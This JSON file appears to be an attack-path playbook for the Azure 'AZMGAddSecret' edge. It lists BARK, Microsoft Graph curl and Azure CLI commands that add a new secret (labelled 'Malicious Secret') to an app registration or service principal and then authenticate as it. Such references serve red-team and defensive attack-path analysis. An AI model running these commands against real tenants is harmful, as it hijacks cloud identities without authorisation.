{
    "AZMGAddSecret": {
        "meaning": "This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has Application.ReadWrite.All or RoleManagement.ReadWrite.Directory MS Graph app roles. This allows adding secrets to applications and service principals to gain control over them.",
        "common": "",
        "windows": {
            "BARK_App_Secret": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-MSGraphTokenWithClientCredentials -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" -ClientSecret \"asdf...\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using Service Principal credentials via BARK"
                },
                {
                    "order": 2,
                    "command": "New-EntraAppSecret -AppRegObjectID \"d878...\" -Token $MGToken.access_token",
                    "description": "Add new secret to target application using BARK"
                },
                {
                    "order": 3,
                    "command": "$SPToken = Get-MSGraphToken -ClientID \"4d31...\" -ClientSecret \"odg8Q~...\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Authenticate as service principal using newly created secret"
                }
            ],
            "BARK_Service_Principal_Secret": [
                {
                    "order": 1,
                    "command": "$MGToken = Get-MSGraphTokenWithClientCredentials -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" -ClientSecret \"asdf...\" -TenantName \"contoso.onmicrosoft.com\"",
                    "description": "Acquire MS Graph-scoped JWT using Service Principal credentials via BARK"
                },
                {
                    "order": 2,
                    "command": "New-ServicePrincipalSecret -ServicePrincipalObjectID \"sp-object-id\" -Token $MGToken.access_token",
                    "description": "Add new secret to target service principal using BARK"
                },
                {
                    "order": 3,
                    "command": "# Use returned secret to authenticate as the service principal",
                    "description": "Authenticate using newly created service principal secret"
                }
            ],
            "Azure_Portal_Manual": [
                {
                    "order": 1,
                    "command": "# Navigate to Azure Portal and access target App Registration",
                    "description": "Access Azure portal with interactive browser session"
                },
                {
                    "order": 2,
                    "command": "# Go to \"Certificates & secrets\" tab and add new client secret",
                    "description": "Add new secret through Azure portal GUI interface"
                },
                {
                    "order": 3,
                    "command": "# Copy the generated secret value for authentication",
                    "description": "Save the newly created secret for future authentication"
                }
            ]
        },
        "linux": {
            "Graph_API_App_Secret": [
                {
                    "order": 1,
                    "command": "curl -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"client_id=CLIENT_ID&client_secret=CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials\" \"https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token\"",
                    "description": "Acquire access token for Microsoft Graph API using client credentials"
                },
                {
                    "order": 2,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://graph.microsoft.com/v1.0/applications/APP_ID/addPassword\" -d '{\"passwordCredential\": {\"displayName\": \"Malicious Secret\"}}'",
                    "description": "Add new password credential to application using Graph API"
                },
                {
                    "order": 3,
                    "command": "# Extract secretText from response and use for authentication",
                    "description": "Use newly created secret to authenticate as the application"
                }
            ],
            "Graph_API_Service_Principal": [
                {
                    "order": 1,
                    "command": "curl -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"client_id=CLIENT_ID&client_secret=CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials\" \"https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token\"",
                    "description": "Acquire access token for Microsoft Graph API using client credentials"
                },
                {
                    "order": 2,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://graph.microsoft.com/v1.0/servicePrincipals/SP_ID/addPassword\" -d '{\"passwordCredential\": {\"displayName\": \"Malicious Secret\"}}'",
                    "description": "Add new password credential to service principal using Graph API"
                },
                {
                    "order": 3,
                    "command": "# Use returned secret for service principal authentication",
                    "description": "Authenticate as service principal using newly created secret"
                }
            ],
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login --service-principal --username CLIENT_ID --password CLIENT_SECRET --tenant TENANT_ID",
                    "description": "Authenticate as Service Principal using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az ad app credential reset --id TARGET_APP_ID --password NEW_SECRET",
                    "description": "Add new credential to target application using Azure CLI"
                },
                {
                    "order": 3,
                    "command": "az login --service-principal --username TARGET_APP_ID --password NEW_SECRET --tenant TENANT_ID",
                    "description": "Authenticate as target application using newly created secret"
                }
            ]
        }
    }
}
